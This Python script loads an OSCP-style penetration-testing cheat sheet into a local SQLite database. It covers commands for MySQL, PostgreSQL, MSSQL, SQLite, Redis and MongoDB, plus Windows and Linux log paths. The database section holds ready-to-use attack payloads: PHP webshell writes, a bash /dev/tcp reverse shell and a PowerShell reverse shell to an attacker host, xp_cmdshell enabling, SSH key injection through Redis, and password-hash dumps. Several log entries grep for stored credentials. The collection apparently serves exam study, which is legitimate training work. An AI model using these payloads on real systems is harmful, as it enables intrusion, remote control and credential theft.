#!/usr/bin/env python3
"""
##############################################
## Freeworld - Allergic to aluminum baby   ##
## OSCP Command DB - DB + Logs Patch       ##
##############################################

Adds:
  - MySQL / MariaDB commands
  - PostgreSQL commands
  - MSSQL commands
  - SQLite commands
  - Redis commands
  - MongoDB commands
  - Log file reference entries (searchable by OS, service, type)
    e.g. "oscp windows logs", "oscp iis logs", "oscp linux cron"

Usage:
    python3 add_db_and_logs.py
"""

import sqlite3
import os
import sys

DB_PATH = os.path.expanduser("~/.oscp_commands.db")

# (tool, description, command, category, tags)
COMMANDS = [

    # ============================================================
    # MySQL / MariaDB
    # ============================================================
    ("mysql", "Connect as root locally",
     "mysql -u root -p",
     "databases", "mysql,connect,local,root"),

    ("mysql", "Connect to remote MySQL with credentials",
     "mysql -h <IP> -u <USER> -p'<PASS>' -P 3306",
     "databases", "mysql,connect,remote,auth"),

    ("mysql", "Connect without password (misconfigured servers)",
     "mysql -h <IP> -u root --skip-password",
     "databases", "mysql,connect,noauth,anonymous"),

    ("mysql", "List all databases",
     "SHOW DATABASES;",
     "databases", "mysql,enum,databases,list"),

    ("mysql", "Select database and list tables",
     "USE <DATABASE>; SHOW TABLES;",
     "databases", "mysql,enum,tables,list"),

    ("mysql", "Dump all columns from a table",
     "SELECT * FROM <TABLE> LIMIT 50;",
     "databases", "mysql,dump,table,select"),

    ("mysql", "Show table structure",
     "DESCRIBE <TABLE>;",
     "databases", "mysql,describe,schema,structure"),

    ("mysql", "Dump all MySQL users and password hashes",
     "SELECT user, host, authentication_string FROM mysql.user;",
     "databases", "mysql,users,hashes,dump,creds"),

    ("mysql", "Dump grants for all users",
     "SELECT * FROM information_schema.USER_PRIVILEGES;",
     "databases", "mysql,grants,enum,privs"),

    ("mysql", "Read file from disk via MySQL (needs FILE priv)",
     "SELECT LOAD_FILE('/etc/passwd');",
     "databases", "mysql,file,read,lfi,privesc"),

    ("mysql", "Write webshell via MySQL INTO OUTFILE",
     "SELECT '<?php system($_GET[\"cmd\"]); ?>' INTO OUTFILE '/var/www/html/shell.php';",
     "databases", "mysql,outfile,webshell,write,rce"),

    ("mysql", "Check secure_file_priv (NULL = unrestricted write)",
     "SHOW VARIABLES LIKE 'secure_file_priv';",
     "databases", "mysql,secure,file,priv,check"),

    ("mysql", "Check current user and privileges",
     "SELECT user(), @@hostname, @@datadir; SHOW GRANTS FOR CURRENT_USER();",
     "databases", "mysql,whoami,privs,enum"),

    ("mysql", "One-liner dump all tables in a database (bash)",
     "mysqldump -h <IP> -u <USER> -p'<PASS>' <DATABASE> > dump.sql",
     "databases", "mysql,dump,mysqldump,export"),

    ("mysql", "Find tables containing 'user' or 'password' keywords",
     "SELECT table_schema, table_name FROM information_schema.tables WHERE table_name LIKE '%user%' OR table_name LIKE '%pass%' OR table_name LIKE '%admin%';",
     "databases", "mysql,search,tables,creds,enum"),

    ("mysql", "Find columns named password/hash across all DBs",
     "SELECT table_schema, table_name, column_name FROM information_schema.columns WHERE column_name LIKE '%pass%' OR column_name LIKE '%hash%' OR column_name LIKE '%secret%' OR column_name LIKE '%token%';",
     "databases", "mysql,search,columns,creds,enum"),

    ("mysql", "Run MySQL one-liner from shell (non-interactive)",
     "mysql -h <IP> -u <USER> -p'<PASS>' -e 'SHOW DATABASES;'",
     "databases", "mysql,oneliner,noninteractive,shell"),

    ("mysql", "Check if UDF escalation possible (plugin dir writable)",
     "SHOW VARIABLES LIKE '%plugin%'; SELECT @@plugin_dir;",
     "databases", "mysql,udf,privesc,plugin"),

    # ============================================================
    # PostgreSQL
    # ============================================================
    ("psql", "Connect to remote PostgreSQL",
     "psql -h <IP> -U <USER> -d <DATABASE> -p 5432",
     "databases", "psql,postgresql,connect,remote"),

    ("psql", "Connect as postgres user locally",
     "psql -U postgres",
     "databases", "psql,postgresql,local,postgres"),

    ("psql", "List all databases (inside psql)",
     "\\l",
     "databases", "psql,postgresql,list,databases"),

    ("psql", "Connect to a database (inside psql)",
     "\\c <DATABASE>",
     "databases", "psql,postgresql,connect,database"),

    ("psql", "List tables in current database",
     "\\dt",
     "databases", "psql,postgresql,list,tables"),

    ("psql", "Describe table structure",
     "\\d <TABLE>",
     "databases", "psql,postgresql,describe,schema"),

    ("psql", "Dump all rows from table",
     "SELECT * FROM <TABLE> LIMIT 50;",
     "databases", "psql,postgresql,select,dump"),

    ("psql", "Dump all PostgreSQL users and password hashes",
     "SELECT usename, passwd FROM pg_shadow;",
     "databases", "psql,postgresql,users,hashes,dump,creds"),

    ("psql", "Show current user and version",
     "SELECT current_user, version();",
     "databases", "psql,postgresql,whoami,version"),

    ("psql", "Check if superuser (is_superuser = on means SA)",
     "SELECT current_user, usesuper FROM pg_user WHERE usename = current_user;",
     "databases", "psql,postgresql,superuser,check,privesc"),

    ("psql", "Read file via COPY command (needs superuser)",
     "CREATE TABLE tmp(data TEXT); COPY tmp FROM '/etc/passwd'; SELECT * FROM tmp;",
     "databases", "psql,postgresql,file,read,copy,privesc"),

    ("psql", "Write file via COPY TO (needs superuser + write perm)",
     "COPY (SELECT '<?php system($_GET[\"cmd\"]); ?>') TO '/var/www/html/shell.php';",
     "databases", "psql,postgresql,file,write,webshell,rce"),

    ("psql", "RCE via COPY TO PROGRAM (PostgreSQL 9.3+)",
     "COPY cmd_exec FROM PROGRAM 'id';",
     "databases", "psql,postgresql,rce,program,copy,privesc"),

    ("psql", "Enable COPY FROM PROGRAM (if not already)",
     "CREATE TABLE cmd_exec(cmd_output TEXT); COPY cmd_exec FROM PROGRAM 'id'; SELECT * FROM cmd_exec;",
     "databases", "psql,postgresql,rce,command,exec,privesc"),

    ("psql", "Reverse shell via COPY FROM PROGRAM",
     "COPY cmd_exec FROM PROGRAM 'bash -c \"bash -i >& /dev/tcp/<KALI_IP>/<PORT> 0>&1\"';",
     "databases", "psql,postgresql,rce,reverse,shell,privesc"),

    ("psql", "Find tables with credential-related column names",
     "SELECT table_schema,table_name,column_name FROM information_schema.columns WHERE column_name ILIKE '%pass%' OR column_name ILIKE '%hash%' OR column_name ILIKE '%secret%' OR column_name ILIKE '%token%';",
     "databases", "psql,postgresql,search,columns,creds,enum"),

    ("psql", "Non-interactive query from shell",
     "psql -h <IP> -U <USER> -d <DB> -c 'SELECT * FROM users;'",
     "databases", "psql,postgresql,oneliner,noninteractive"),

    ("psql", "pg_dump full database export",
     "pg_dump -h <IP> -U <USER> <DATABASE> > dump.sql",
     "databases", "psql,postgresql,dump,export,pgdump"),

    # ============================================================
    # MSSQL
    # ============================================================
    ("mssql", "Connect via impacket-mssqlclient (Windows auth)",
     "impacket-mssqlclient <DOMAIN>/<USER>:'<PASS>'@<IP> -windows-auth",
     "databases", "mssql,impacket,connect,windows,auth"),

    ("mssql", "Connect via impacket-mssqlclient (SQL auth)",
     "impacket-mssqlclient <USER>:'<PASS>'@<IP>",
     "databases", "mssql,impacket,connect,sql,auth"),

    ("mssql", "Connect via sqsh (interactive MSSQL client)",
     "sqsh -S <IP> -U <USER> -P '<PASS>' -D <DATABASE>",
     "databases", "mssql,sqsh,connect,interactive"),

    ("mssql", "List all databases",
     "SELECT name FROM sys.databases; GO",
     "databases", "mssql,enum,databases,list"),

    ("mssql", "List tables in current database",
     "SELECT table_name FROM information_schema.tables WHERE table_type='BASE TABLE'; GO",
     "databases", "mssql,enum,tables,list"),

    ("mssql", "Dump all rows from a table",
     "SELECT TOP 50 * FROM <TABLE>; GO",
     "databases", "mssql,dump,select,table"),

    ("mssql", "Enable xp_cmdshell (requires sysadmin)",
     "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;",
     "databases", "mssql,xpcmdshell,enable,rce,privesc"),

    ("mssql", "Execute OS command via xp_cmdshell",
     "EXEC xp_cmdshell 'whoami'; GO",
     "databases", "mssql,xpcmdshell,rce,exec,command"),

    ("mssql", "Reverse shell via xp_cmdshell",
     "EXEC xp_cmdshell 'powershell -nop -c \"$c=New-Object Net.Sockets.TCPClient(''<KALI_IP>'',<PORT>);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$s.Write(([Text.ASCIIEncoding]::ASCII.GetBytes($r)),0,$r.Length)};$c.Close()\"'; GO",
     "databases", "mssql,xpcmdshell,powershell,reverse,shell"),

    ("mssql", "Read file via BULK INSERT (needs read perms)",
     "CREATE TABLE tmp (data NVARCHAR(MAX)); BULK INSERT tmp FROM 'C:\\Windows\\System32\\drivers\\etc\\hosts' WITH (ROWTERMINATOR='\\n'); SELECT * FROM tmp;",
     "databases", "mssql,file,read,bulk,insert"),

    ("mssql", "Check if current user is sysadmin",
     "SELECT IS_SRVROLEMEMBER('sysadmin'); GO",
     "databases", "mssql,sysadmin,check,privesc"),

    ("mssql", "List all SQL logins and roles",
     "SELECT name, type_desc, is_disabled FROM sys.server_principals WHERE type IN ('S','U','G'); GO",
     "databases", "mssql,logins,enum,users"),

    ("mssql", "Linked server enumeration (pivot path)",
     "SELECT name FROM sys.servers; EXEC sp_linkedservers; GO",
     "databases", "mssql,linked,servers,enum,pivot"),

    ("mssql", "Execute command on linked server",
     "EXEC ('xp_cmdshell ''whoami''') AT [<LINKED_SERVER>]; GO",
     "databases", "mssql,linked,server,rce,pivot"),

    ("mssql", "Find tables with credential columns",
     "SELECT TABLE_SCHEMA,TABLE_NAME,COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE COLUMN_NAME LIKE '%pass%' OR COLUMN_NAME LIKE '%hash%' OR COLUMN_NAME LIKE '%secret%' OR COLUMN_NAME LIKE '%token%'; GO",
     "databases", "mssql,search,columns,creds,enum"),

    ("mssql", "Impersonate another SQL login (if IMPERSONATE granted)",
     "EXECUTE AS LOGIN = 'sa'; SELECT SYSTEM_USER; GO",
     "databases", "mssql,impersonate,login,privesc"),

    # ============================================================
    # SQLite
    # ============================================================
    ("sqlite3", "Find SQLite databases on disk",
     "find / -name '*.sqlite' -o -name '*.sqlite3' -o -name '*.db' 2>/dev/null",
     "databases", "sqlite,find,databases,disk"),

    ("sqlite3", "Open SQLite database file",
     "sqlite3 <FILE>.db",
     "databases", "sqlite,open,connect"),

    ("sqlite3", "List all tables",
     ".tables",
     "databases", "sqlite,list,tables"),

    ("sqlite3", "Show schema for all tables",
     ".schema",
     "databases", "sqlite,schema,structure"),

    ("sqlite3", "Dump all rows from a table",
     "SELECT * FROM <TABLE>;",
     "databases", "sqlite,dump,select,table"),

    ("sqlite3", "Search all tables for password/hash columns",
     "SELECT name FROM sqlite_master WHERE type='table'; -- then: SELECT * FROM <each table>;",
     "databases", "sqlite,search,tables,creds"),

    ("sqlite3", "Dump entire DB to SQL file",
     "sqlite3 <FILE>.db .dump > dump.sql",
     "databases", "sqlite,dump,export,sql"),

    ("sqlite3", "One-liner: extract users from common app DBs",
     "sqlite3 <FILE>.db 'SELECT * FROM users;'",
     "databases", "sqlite,oneliner,users,creds"),

    # ============================================================
    # Redis
    # ============================================================
    ("redis", "Connect to Redis (unauthenticated)",
     "redis-cli -h <IP> -p 6379",
     "databases", "redis,connect,unauthenticated"),

    ("redis", "Connect to Redis with password",
     "redis-cli -h <IP> -p 6379 -a '<PASS>'",
     "databases", "redis,connect,auth,password"),

    ("redis", "Authenticate after connecting",
     "AUTH <PASSWORD>",
     "databases", "redis,auth,authenticate"),

    ("redis", "List all keys",
     "KEYS *",
     "databases", "redis,keys,list,enum"),

    ("redis", "Get value of a key",
     "GET <KEY>",
     "databases", "redis,get,value,key"),

    ("redis", "Get Redis server info (version, config dir, dbfilename)",
     "INFO server",
     "databases", "redis,info,server,enum"),

    ("redis", "Get config (find dir + dbfilename for file write)",
     "CONFIG GET dir; CONFIG GET dbfilename",
     "databases", "redis,config,dir,filename,enum"),

    ("redis", "Write SSH key to authorized_keys via Redis",
     "CONFIG SET dir /root/.ssh/\nCONFIG SET dbfilename authorized_keys\nSET pwn \"\\n\\n<YOUR_PUBKEY>\\n\\n\"\nSAVE",
     "databases", "redis,ssh,authorized,keys,rce,privesc"),

    ("redis", "Write PHP webshell via Redis (if web dir writable)",
     "CONFIG SET dir /var/www/html/\nCONFIG SET dbfilename shell.php\nSET pwn '<?php system($_GET[\"cmd\"]); ?>'\nSAVE",
     "databases", "redis,webshell,php,write,rce"),

    ("redis", "Dump all key-value pairs (bash one-liner)",
     "redis-cli -h <IP> --scan | while read k; do echo \"$k: $(redis-cli -h <IP> GET $k)\"; done",
     "databases", "redis,dump,all,keys,oneliner"),

    # ============================================================
    # MongoDB
    # ============================================================
    ("mongo", "Connect to MongoDB (unauthenticated)",
     "mongosh <IP>:27017",
     "databases", "mongo,mongodb,connect,unauthenticated"),

    ("mongo", "Connect with credentials",
     "mongosh mongodb://<USER>:<PASS>@<IP>:27017/<DATABASE>",
     "databases", "mongo,mongodb,connect,auth"),

    ("mongo", "List all databases",
     "show dbs",
     "databases", "mongo,mongodb,list,databases"),

    ("mongo", "Use a database",
     "use <DATABASE>",
     "databases", "mongo,mongodb,use,database"),

    ("mongo", "List collections (tables)",
     "show collections",
     "databases", "mongo,mongodb,list,collections"),

    ("mongo", "Dump all documents from a collection",
     "db.<COLLECTION>.find().pretty()",
     "databases", "mongo,mongodb,dump,find,documents"),

    ("mongo", "Search collection for password-like fields",
     "db.<COLLECTION>.find({},{password:1,username:1,email:1,_id:0})",
     "databases", "mongo,mongodb,search,creds,fields"),

    ("mongo", "List all users",
     "use admin; db.system.users.find().pretty()",
     "databases", "mongo,mongodb,users,list,enum"),

    ("mongo", "Check server status",
     "db.serverStatus()",
     "databases", "mongo,mongodb,status,enum"),

    # ============================================================
    # LOG FILES — Windows
    # All tagged with 'logs,windows' so 'oscp windows logs' returns all
    # Service-specific tags allow 'oscp iis logs', 'oscp rdp logs' etc.
    # ============================================================

    # Windows System Logs
    ("logs", "Windows System Event Log (system crashes, driver errors)",
     "C:\\Windows\\System32\\winevt\\Logs\\System.evtx",
     "logs", "logs,windows,system,evtx,windows-logs"),

    ("logs", "Windows Security Event Log (logons 4624/4625, privesc 4672)",
     "C:\\Windows\\System32\\winevt\\Logs\\Security.evtx",
     "logs", "logs,windows,security,evtx,logon,windows-logs"),

    ("logs", "Windows Application Event Log",
     "C:\\Windows\\System32\\winevt\\Logs\\Application.evtx",
     "logs", "logs,windows,application,evtx,windows-logs"),

    ("logs", "PowerShell Operational Log (commands run — gold for blue team)",
     "C:\\Windows\\System32\\winevt\\Logs\\Microsoft-Windows-PowerShell%4Operational.evtx",
     "logs", "logs,windows,powershell,operational,evtx,windows-logs"),

    ("logs", "PowerShell Script Block Log (full PS script logging)",
     "C:\\Windows\\System32\\winevt\\Logs\\Microsoft-Windows-PowerShell%4Operational.evtx",
     "logs", "logs,windows,powershell,scriptblock,evtx,windows-logs"),

    ("logs", "Scheduled Tasks Operational Log",
     "C:\\Windows\\System32\\winevt\\Logs\\Microsoft-Windows-TaskScheduler%4Operational.evtx",
     "logs", "logs,windows,schtasks,scheduler,evtx,windows-logs"),

    ("logs", "Windows Defender Operational Log",
     "C:\\Windows\\System32\\winevt\\Logs\\Microsoft-Windows-Windows Defender%4Operational.evtx",
     "logs", "logs,windows,defender,av,evtx,windows-logs"),

    ("logs", "Windows Firewall Log (dropped/allowed packets)",
     "C:\\Windows\\System32\\LogFiles\\Firewall\\pfirewall.log",
     "logs", "logs,windows,firewall,network,pfirewall,windows-logs"),

    ("logs", "WMI Activity Operational Log (WMI-based lateral movement)",
     "C:\\Windows\\System32\\winevt\\Logs\\Microsoft-Windows-WMI-Activity%4Operational.evtx",
     "logs", "logs,windows,wmi,activity,evtx,windows-logs"),

    ("logs", "Windows DNS Server Log",
     "C:\\Windows\\System32\\Winevt\\Logs\\DNS Server.evtx",
     "logs", "logs,windows,dns,server,evtx,windows-logs"),

    # IIS Logs
    ("logs", "IIS Default Access Log Location",
     "C:\\inetpub\\logs\\LogFiles\\W3SVC1\\u_ex<YYMMDD>.log",
     "logs", "logs,windows,iis,web,access,w3c,iis-logs,windows-logs"),

    ("logs", "IIS Log — find URLs with passwords/tokens in query string",
     "findstr /si \"password\\|pass=\\|token=\\|key=\\|secret=\" C:\\inetpub\\logs\\LogFiles\\W3SVC1\\*.log",
     "logs", "logs,windows,iis,grep,password,creds,iis-logs,windows-logs"),

    ("logs", "IIS Log — find POST requests (may contain creds)",
     "findstr /si \"POST\" C:\\inetpub\\logs\\LogFiles\\W3SVC1\\*.log",
     "logs", "logs,windows,iis,post,creds,iis-logs,windows-logs"),

    ("logs", "IIS Log — find 500 errors (app errors leaking info)",
     "findstr /si \" 500 \" C:\\inetpub\\logs\\LogFiles\\W3SVC1\\*.log",
     "logs", "logs,windows,iis,500,error,iis-logs,windows-logs"),

    ("logs", "IIS Log — alternate location (applicationHost.config defines actual path)",
     "C:\\Windows\\System32\\inetsrv\\config\\applicationHost.config  # check logFile path attribute",
     "logs", "logs,windows,iis,config,path,iis-logs,windows-logs"),

    # RDP Logs
    ("logs", "RDP TerminalServices-LocalSessionManager (successful RDP logons)",
     "C:\\Windows\\System32\\winevt\\Logs\\Microsoft-Windows-TerminalServices-LocalSessionManager%4Operational.evtx",
     "logs", "logs,windows,rdp,terminal,services,session,rdp-logs,windows-logs"),

    ("logs", "RDP RemoteConnectionManager Log (incoming connections)",
     "C:\\Windows\\System32\\winevt\\Logs\\Microsoft-Windows-TerminalServices-RemoteConnectionManager%4Operational.evtx",
     "logs", "logs,windows,rdp,remote,connection,rdp-logs,windows-logs"),

    # MSSQL Logs
    ("logs", "MSSQL Error Log (contains login failures + connection strings)",
     "C:\\Program Files\\Microsoft SQL Server\\MSSQL<VER>.MSSQLSERVER\\MSSQL\\Log\\ERRORLOG",
     "logs", "logs,windows,mssql,sql,error,mssql-logs,windows-logs"),

    ("logs", "MSSQL Error Log (find credential-related lines)",
     "findstr /si \"password\\|login\\|failed\\|error\" \"C:\\Program Files\\Microsoft SQL Server\\MSSQL*.MSSQLSERVER\\MSSQL\\Log\\ERRORLOG\"",
     "logs", "logs,windows,mssql,sql,grep,creds,mssql-logs,windows-logs"),

    # Windows Credential / Auth Logs
    ("logs", "NTLM Authentication Log (legacy auth, credential capture)",
     "C:\\Windows\\System32\\winevt\\Logs\\Microsoft-Windows-NTLM%4Operational.evtx",
     "logs", "logs,windows,ntlm,auth,credential,windows-logs"),

    ("logs", "Kerberos KDC Log (ticket requests, AS-REQ, TGS-REQ)",
     "C:\\Windows\\System32\\winevt\\Logs\\Security.evtx  # Event ID 4769 (TGS), 4768 (AS-REQ), 4771 (AS-REP fail)",
     "logs", "logs,windows,kerberos,kdc,ticket,windows-logs"),

    # Windows grep one-liners
    ("logs", "PowerShell: grep all Windows evtx logs for keywords",
     "Get-WinEvent -Path 'C:\\Windows\\System32\\winevt\\Logs\\Security.evtx' | Where-Object {$_.Message -match 'password|credential|secret'} | Select TimeCreated,Message",
     "logs", "logs,windows,grep,powershell,keyword,search,windows-logs"),

    ("logs", "CMD: findstr across all IIS logs for passwords",
     "findstr /si \"pass=\\|password=\\|pwd=\\|token=\\|secret=\" C:\\inetpub\\logs\\LogFiles\\W3SVC*\\*.log",
     "logs", "logs,windows,iis,findstr,grep,creds,windows-logs"),

    # ============================================================
    # LOG FILES — Linux
    # Tagged 'logs,linux' so 'oscp linux logs' returns all
    # ============================================================

    # Linux System Logs
    ("logs", "Linux auth log (SSH logons, sudo, su — gold for creds)",
     "/var/log/auth.log  (Debian/Ubuntu) | /var/log/secure  (CentOS/RHEL)",
     "logs", "logs,linux,auth,ssh,sudo,su,linux-logs"),

    ("logs", "Linux syslog (general system events)",
     "/var/log/syslog  (Debian) | /var/log/messages  (RHEL)",
     "logs", "logs,linux,syslog,messages,system,linux-logs"),

    ("logs", "Linux kernel log (boot, hardware errors)",
     "/var/log/kern.log",
     "logs", "logs,linux,kernel,kern,linux-logs"),

    ("logs", "Linux boot log",
     "/var/log/boot.log",
     "logs", "logs,linux,boot,linux-logs"),

    ("logs", "Linux dpkg install log (shows what's been installed)",
     "/var/log/dpkg.log",
     "logs", "logs,linux,dpkg,packages,installed,linux-logs"),

    ("logs", "Bash: grep auth.log for accepted SSH keys",
     "grep -i 'accepted\\|publickey\\|password' /var/log/auth.log",
     "logs", "logs,linux,auth,ssh,grep,key,linux-logs"),

    ("logs", "Bash: grep auth.log for failed logins + usernames",
     "grep -i 'failed\\|invalid user\\|authentication failure' /var/log/auth.log | grep -oP 'user \\K\\S+'",
     "logs", "logs,linux,auth,failed,users,grep,linux-logs"),

    ("logs", "Bash: grep syslog for credential-related strings",
     "grep -i 'password\\|passwd\\|credential\\|secret\\|token' /var/log/syslog 2>/dev/null",
     "logs", "logs,linux,syslog,grep,creds,linux-logs"),

    # Apache Logs
    ("logs", "Apache access log (GET/POST params may contain creds)",
     "/var/log/apache2/access.log  (Debian) | /var/log/httpd/access_log  (RHEL)",
     "logs", "logs,linux,apache,web,access,apache-logs,linux-logs"),

    ("logs", "Apache error log (stack traces, paths, misconfigs)",
     "/var/log/apache2/error.log  (Debian) | /var/log/httpd/error_log  (RHEL)",
     "logs", "logs,linux,apache,web,error,apache-logs,linux-logs"),

    ("logs", "Apache: grep access log for passwords in URLs",
     "grep -E 'pass=|password=|passwd=|token=|secret=|key=' /var/log/apache2/access.log",
     "logs", "logs,linux,apache,grep,creds,urls,apache-logs,linux-logs"),

    ("logs", "Apache: grep access log for POST requests",
     "grep ' POST ' /var/log/apache2/access.log | head -50",
     "logs", "logs,linux,apache,post,grep,apache-logs,linux-logs"),

    ("logs", "Apache: grep error log for PHP errors revealing paths",
     "grep -i 'php\\|fatal\\|warning\\|undefined' /var/log/apache2/error.log | tail -50",
     "logs", "logs,linux,apache,php,error,paths,apache-logs,linux-logs"),

    # Nginx Logs
    ("logs", "Nginx access log",
     "/var/log/nginx/access.log",
     "logs", "logs,linux,nginx,web,access,nginx-logs,linux-logs"),

    ("logs", "Nginx error log",
     "/var/log/nginx/error.log",
     "logs", "logs,linux,nginx,web,error,nginx-logs,linux-logs"),

    ("logs", "Nginx: grep access log for credentials in query strings",
     "grep -E 'pass=|password=|token=|secret=|key=|auth=' /var/log/nginx/access.log",
     "logs", "logs,linux,nginx,grep,creds,nginx-logs,linux-logs"),

    ("logs", "Nginx: find vhost-specific log paths",
     "grep -r 'access_log\\|error_log' /etc/nginx/sites-enabled/ /etc/nginx/conf.d/",
     "logs", "logs,linux,nginx,vhost,paths,nginx-logs,linux-logs"),

    # MySQL Logs
    ("logs", "MySQL general query log (ALL queries — may contain creds)",
     "/var/log/mysql/mysql.log | check: SHOW VARIABLES LIKE 'general_log_file';",
     "logs", "logs,linux,mysql,query,general,mysql-logs,linux-logs"),

    ("logs", "MySQL error log (connection failures, startup info)",
     "/var/log/mysql/error.log",
     "logs", "logs,linux,mysql,error,mysql-logs,linux-logs"),

    ("logs", "MySQL: grep error log for passwords/users",
     "grep -i 'password\\|access denied\\|using password' /var/log/mysql/error.log",
     "logs", "logs,linux,mysql,grep,creds,mysql-logs,linux-logs"),

    ("logs", "MySQL: check if query log is enabled (major cred leak risk)",
     "mysql -u root -p -e \"SHOW VARIABLES LIKE 'general_log%';\"",
     "logs", "logs,linux,mysql,general,log,check,mysql-logs,linux-logs"),

    # Cron Logs
    ("logs", "Cron log (Debian — all cron job runs)",
     "/var/log/syslog  # grep for CRON",
     "logs", "logs,linux,cron,syslog,cron-logs,linux-logs"),

    ("logs", "Cron log (RHEL/CentOS — dedicated cron log)",
     "/var/log/cron",
     "logs", "logs,linux,cron,rhel,centos,cron-logs,linux-logs"),

    ("logs", "Cron: grep syslog for cron entries (commands run + timing)",
     "grep -i 'cron' /var/log/syslog | tail -100",
     "logs", "logs,linux,cron,grep,syslog,cron-logs,linux-logs"),

    ("logs", "Cron: watch cron activity live (for privesc timing)",
     "grep -i cron /var/log/syslog -f",
     "logs", "logs,linux,cron,live,watch,privesc,cron-logs,linux-logs"),

    ("logs", "Cron job files to check for hardcoded creds",
     "/etc/crontab | /etc/cron.d/* | /etc/cron.hourly/* | /etc/cron.daily/* | /var/spool/cron/crontabs/*",
     "logs", "logs,linux,cron,files,creds,cron-logs,linux-logs"),

    # SSH Logs
    ("logs", "SSH: all successful logins from auth.log",
     "grep 'Accepted' /var/log/auth.log",
     "logs", "logs,linux,ssh,accepted,logon,ssh-logs,linux-logs"),

    ("logs", "SSH: all failed login attempts",
     "grep 'Failed\\|Invalid\\|authentication failure' /var/log/auth.log",
     "logs", "logs,linux,ssh,failed,brute,ssh-logs,linux-logs"),

    ("logs", "SSH: extract usernames from failed logins",
     "grep 'Invalid user' /var/log/auth.log | awk '{print $8}' | sort | uniq -c | sort -rn",
     "logs", "logs,linux,ssh,users,invalid,ssh-logs,linux-logs"),

    ("logs", "SSH: extract source IPs from failed logins",
     "grep 'Failed password' /var/log/auth.log | awk '{print $11}' | sort | uniq -c | sort -rn | head -20",
     "logs", "logs,linux,ssh,ips,brute,source,ssh-logs,linux-logs"),

    # Mail Logs
    ("logs", "Mail log — Postfix/Sendmail (may reveal internal relay creds)",
     "/var/log/mail.log  (Debian) | /var/log/maillog  (RHEL)",
     "logs", "logs,linux,mail,postfix,sendmail,mail-logs,linux-logs"),

    ("logs", "Mail: grep log for SASL auth (SMTP credentials in transit)",
     "grep -i 'sasl\\|authentication\\|login' /var/log/mail.log",
     "logs", "logs,linux,mail,sasl,smtp,creds,mail-logs,linux-logs"),

    # Application & Misc Linux Logs
    ("logs", "PHP-FPM log (errors + paths)",
     "/var/log/php-fpm/www-error.log | /var/log/php7.x-fpm.log",
     "logs", "logs,linux,php,fpm,error,php-logs,linux-logs"),

    ("logs", "Redis log",
     "/var/log/redis/redis-server.log",
     "logs", "logs,linux,redis,redis-logs,linux-logs"),

    ("logs", "PostgreSQL log",
     "/var/log/postgresql/postgresql-<VER>-main.log",
     "logs", "logs,linux,postgresql,psql,postgres-logs,linux-logs"),

    ("logs", "MongoDB log",
     "/var/log/mongodb/mongod.log",
     "logs", "logs,linux,mongodb,mongo,mongo-logs,linux-logs"),

    ("logs", "FTP log (vsftpd — usernames and commands)",
     "/var/log/vsftpd.log",
     "logs", "logs,linux,ftp,vsftpd,ftp-logs,linux-logs"),

    ("logs", "Tomcat access log",
     "/opt/tomcat/logs/localhost_access_log.<DATE>.txt | /var/log/tomcat*/access_log",
     "logs", "logs,linux,tomcat,java,web,access,tomcat-logs,linux-logs"),

    ("logs", "Tomcat catalina log (startup errors + creds in stack traces)",
     "/opt/tomcat/logs/catalina.out",
     "logs", "logs,linux,tomcat,catalina,error,java,tomcat-logs,linux-logs"),

    # Universal grep for logs
    ("logs", "Grep ALL log files for credentials (Linux)",
     "grep -rni 'password\\|passwd\\|secret\\|api_key\\|token\\|credential' /var/log/ 2>/dev/null",
     "logs", "logs,linux,grep,all,creds,password,linux-logs"),

    ("logs", "Find recently modified log files (last 30 min)",
     "find /var/log -mmin -30 -type f 2>/dev/null",
     "logs", "logs,linux,recent,modified,find,linux-logs"),

    ("logs", "Check log file sizes (large logs = active service)",
     "du -sh /var/log/* 2>/dev/null | sort -rh | head -20",
     "logs", "logs,linux,size,active,service,linux-logs"),

]


def main():
    if not os.path.exists(DB_PATH):
        print(f"[-] DB not found: {DB_PATH}")
        print("    Run oscp_db_setup.py first.")
        sys.exit(1)

    conn = sqlite3.connect(DB_PATH)
    cur = conn.cursor()

    # Schema check
    cur.execute("PRAGMA table_info(commands)")
    cols = [row[1] for row in cur.fetchall()]
    expected = {"tool", "description", "command", "category", "tags"}
    if not expected.issubset(set(cols)):
        print(f"[-] Schema mismatch. Expected: {expected}, Found: {cols}")
        sys.exit(1)

    # Add 'databases' and 'logs' categories if not already present
    cur.execute("SELECT COUNT(*) FROM commands WHERE category = 'databases'")
    cur.execute("SELECT COUNT(*) FROM commands WHERE category = 'logs'")

    added = 0
    skipped = 0
    for tool, desc, cmd, cat, tags in COMMANDS:
        cur.execute("SELECT COUNT(*) FROM commands WHERE command = ?", (cmd,))
        if cur.fetchone()[0] > 0:
            skipped += 1
            continue
        cur.execute(
            "INSERT INTO commands (tool, description, command, category, tags) VALUES (?, ?, ?, ?, ?)",
            (tool, desc, cmd, cat, tags),
        )
        added += 1

    conn.commit()

    cur.execute("SELECT COUNT(*) FROM commands")
    total = cur.fetchone()[0]

    print(f"\n[+] Added:   {added}")
    print(f"[~] Skipped: {skipped} (already in DB)")
    print(f"[=] Total commands in DB now: {total}")

    print("\n[*] Per-category counts:")
    cur.execute("SELECT category, COUNT(*) FROM commands GROUP BY category ORDER BY category")
    for row in cur.fetchall():
        print(f"    {row[0]:<20}  {row[1]}")

    conn.close()

    print("\n[*] Try it out:")
    print("    oscp mysql")
    print("    oscp psql")
    print("    oscp mssql xpcmdshell")
    print("    oscp sqlite")
    print("    oscp redis")
    print("    oscp mongo")
    print("    oscp windows logs")
    print("    oscp iis logs")
    print("    oscp rdp logs")
    print("    oscp linux logs")
    print("    oscp linux cron")
    print("    oscp apache logs")
    print("    oscp nginx logs")
    print("    oscp ssh logs")
    print("    oscp mysql logs")
    print("    oscp mssql logs")
    print("    oscp logs grep")


if __name__ == "__main__":
    print("\n" + "=" * 60)
    print("DB + Logs Patch — OSCP Command Database")
    print("Freeworld / 1337 Pete")
    print("=" * 60 + "\n")
    main()
